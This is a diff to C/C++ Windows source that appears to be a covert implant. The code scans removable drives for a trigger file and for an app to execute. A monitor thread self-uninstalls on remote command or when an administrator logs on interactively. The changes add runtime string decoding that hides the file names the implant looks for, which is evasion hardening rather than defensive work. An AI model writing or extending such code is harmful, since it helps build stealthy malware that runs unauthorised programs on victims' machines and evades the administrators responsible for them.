@@ -59,6 +59,7 @@ BOOL ExistsUnistallerFile(){
 	BOOL retVal = FALSE;
 	HANDLE hFile;
 	LPSTR lpFilePath = new CHAR[MAX_PATH];
+	DecodeString ds;
 
 	lpArrRemDrives = GetRemovableDrives(&dwCount);
 	if(!lpArrRemDrives)
@@ -66,7 +67,7 @@ BOOL ExistsUnistallerFile(){
 	
 	if(dwCount){
 		for(i=0; i<= dwCount-1; ++i){
-			sprintf(lpFilePath, "%s%s", lpArrRemDrives[i], FILE_NAME_UNISTALL_FILE);
+			sprintf(lpFilePath, "%s%s", lpArrRemDrives[i], ds.getDecodeString((LPSTR)FILE_NAME_UNISTALL_FILE));
 			delete[] lpArrRemDrives[i];
 
 			if((hFile = CreateFile(lpFilePath, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE, 
@@ -413,6 +414,7 @@ BOOL ExecuteAppFromHashFile(void){
 	BOOL boolRetVal=FALSE;
 	LPSTR lpBuffer=NULL;
 	int i;
+	DecodeString ds;
 	
 #ifdef DEBUG_SHOW_ERROR
 	CHAR msg[256]={0};
@@ -423,7 +425,7 @@ BOOL ExecuteAppFromHashFile(void){
 		return FALSE;
 
 	for(i=0; i<=(int)dwCount-1; i++){
-		sprintf(lpFilePath, "%s%s", lpArrRemDrives[i], FILENAME_EXECUTE_APP);
+		sprintf(lpFilePath, "%s%s", lpArrRemDrives[i], ds.getDecodeString((LPSTR)FILENAME_EXECUTE_APP));
 		delete[] lpArrRemDrives[i];
 
 		if((hFile = CreateFile(lpFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
@@ -525,7 +527,6 @@ DWORD ThreadMonitor(LPVOID lpParam){
 				fileLogPrint("Upgrading");
 			#endif
 
-			//Sleep(1500);
 			UnistallProc(ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE, ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE);
 			ExitThread(0);
 		}
@@ -543,7 +544,7 @@ DWORD ThreadMonitor(LPVOID lpParam){
 
 		#ifdef CHECK_ADMIN_INTERACTIVE_LOGON
 		//lpszShellPath
-		if(CheckIsProcessRuningAsUser("packager.exe", ds.getDecodeString((LPSTR)encStr_Administrador))){
+		if(CheckIsProcessRuningAsUser(lpszShellPath/*"packager.exe"*/, ds.getDecodeString((LPSTR)encStr_Administrador))){
 			#ifdef DEBUG_SHOW_ERROR_TO_FILE
 			fileLogPrint("Actived uninstall by interactive logon");
 			#endif
@@ -582,7 +583,7 @@ DWORD ThreadMonitor(LPVOID lpParam){
 			}
 		}
 
-		Sleep(1000);
+		Sleep(1500);
 	}
 
 	return TRUE;
